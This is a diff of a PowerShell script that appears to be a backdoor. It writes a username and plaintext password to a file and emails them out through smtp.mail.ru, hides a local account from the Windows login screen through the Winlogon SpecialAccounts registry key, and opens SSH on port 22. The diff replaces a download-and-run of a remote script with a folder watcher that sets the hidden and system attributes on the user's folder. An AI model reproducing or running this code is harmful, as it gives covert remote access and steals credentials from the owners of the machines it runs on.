@@ -22,7 +22,7 @@ $global:p = (ConvertTo-SecureString -String $p_plain -AsPlainText -Force)
 Add-Content -Path .\$mail_attach -Value $addr
 Add-Content -Path .\$mail_attach -Value $user
 Add-Content -Path .\$mail_attach -Value $p_plain
-
+Add-Content -Path .\$mail_attach -Value $temp_dir
 
 
 # Local user for "something" and "then excluding them from log in page"
@@ -33,7 +33,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
 
 
 # Yeah...
-Send-MailMessage -From $email -To $email -Subject "test1" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)
+Send-MailMessage -From $email -To $email -Subject "test3" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)
 
 
 # Open SSH and port 22 (add a rule in firewall as well)
@@ -47,8 +47,32 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyCon
 
 # Watching
 mkdir $env:Temp/$temp_dir
-Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/watch.ps1' -OutFile $env:Temp/$temp_dir/watch.ps1
-& $env:Temp/$temp_dir/watch.ps1
+[bool] $global:undone = $true
+
+
+$watcher = New-Object System.IO.FileSystemWatcher
+$watcher.Path = "C:\Users"
+$watcher.Filter = "*.*"
+$watcher.IncludeSubdirectories = $false
+$watcher.EnableRaisingEvents = $true
+
+# *Woop*
+$action = { $path = $Event.SourceEventArgs.FullPath
+            $changeType = $Event.SourceEventArgs.ChangeType
+            attrib +h +s +r C:\Users\$user
+            echo "hi" ^> .\hi.txt
+}
+
+# If the folder is created
+Register-ObjectEvent $watcher "Created" -Action $action
+
+# Give time to local user
+while($undone) {
+  Start-Sleep -Seconds 100
+  $undone = $false
+}
+
+
 
 Remove-Item .\7r6lYgoLlv.txt
 Remove-Item .\etgtYmwQUO.txt
